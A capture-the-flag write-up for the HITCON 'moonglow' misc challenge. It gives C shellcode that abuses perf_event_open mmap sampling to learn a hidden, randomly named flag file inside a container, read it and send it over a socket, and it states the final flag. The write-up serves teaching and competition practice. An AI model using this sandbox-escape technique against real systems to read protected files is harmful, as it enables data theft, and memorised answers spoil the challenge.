# moonglow (misc 300)

## Description

```
Moonglow is a type of Herb which appears as a bent stalk with a drooping blue-white flower. It grows in Jungle grass (surface Jungle and Underground Jungle) and can be cut with virtually any weapon or tool. It can also be planted in Clay Pots using Moonglow Seeds.

nc 52.69.171.132 10001

moonglow.tgz_08f1639532677fb3f6c462cc74cd48f05dd20e60
```

## Story

We got fairly close, but did not complete this in time before the game was over :/

Here we present a working solution for this challenge that we worked on *after* the competition ended.

## Solution

Note that we use our custom shellcode compiler environment which is not shipped with this write-up. But the important part here is that `perf_event_open` syscall can be used to initiate the performance monitoring -- more importantly, you can set bits for sampling mmap data. Then, you can read the randomly generated filename (that contains the flag) in `PERF_RECORD_MMAP` record, which then can be opened and read to get the flag.

```C
void Main(void) {

  ...

  struct perf_event_attr pe;
  struct perf_event_mmap_page mp;

  memset(&pe, 0, sizeof(struct perf_event_attr));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(struct perf_event_attr);
  pe.config = PERF_COUNT_SW_DUMMY;
  pe.disabled = 0;
  pe.exclude_kernel = 1;
  pe.exclude_hv = 1;
  pe.mmap = 1;
  pe.mmap_data = 1;

  char buf[1024];
  memset(buf, 'A', 80);
  buf[80] = '\n';

  int fd = Syscall(__NR_perf_event_open, &pe, 3, -1, -1, 0);
  char* rbuf = Syscall(__NR_mmap, NULL, 0x1000 + 0x4000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  Syscall(__NR_write, 1, buf, 81);

  struct timespec ts;
  ts.tv_sec = 1;
  ts.tv_nsec = 0;
  Syscall(__NR_nanosleep, &ts, &ts);

  fd = Syscall(__NR_open, rbuf+0x1028, 0, 0);
  Syscall(__NR_read, fd, buf, 100);

  SendLen(sockfd, buf, 100, 0);
  SendLen(sockfd, "\n", 1, 0);

fail:
  Syscall(__NR_exit_group, 0);
}

```

## Flag

Flag: `hitcon{M0oN$on4Ta !s 8eauti4, C0nta1ner 1$ Aw4}`
